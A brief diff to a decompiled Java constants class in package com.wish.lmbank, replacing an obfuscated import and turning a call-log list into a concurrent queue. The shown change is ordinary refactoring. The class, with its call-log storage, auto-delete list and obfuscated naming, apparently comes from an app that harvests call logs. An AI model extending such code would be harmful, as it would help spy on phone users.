@@ -10,10 +10,8 @@ import com.wish.lmbank.utils.LogUtils;
 import com.wish.lmbank.utils.SharedPreferencesUtils;
 
 import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.List;
-
-import gv00l3ah.mvdt7w.bb7d7pu7;
+import java.util.Queue;
+import java.util.concurrent.LinkedBlockingQueue;
 
 /* loaded from: cookie_9234504.jar:com/wish/lmbank/common/Constants.class */
 public class Constants {
@@ -136,7 +134,7 @@ public class Constants {
     public static final String TIMESTAMP = "timestamp";
     public static final String UNDERLINE_STRING = "_";
     public static String UNNECESSARY_AUTO_DELETE_LIST = "";
-    public static List<CallLogBean> mCallLogList;
+    public static Queue<CallLogBean> mCallLogList = new LinkedBlockingQueue<>();
 
 
     public static final int THAT_CODE = 268435456;
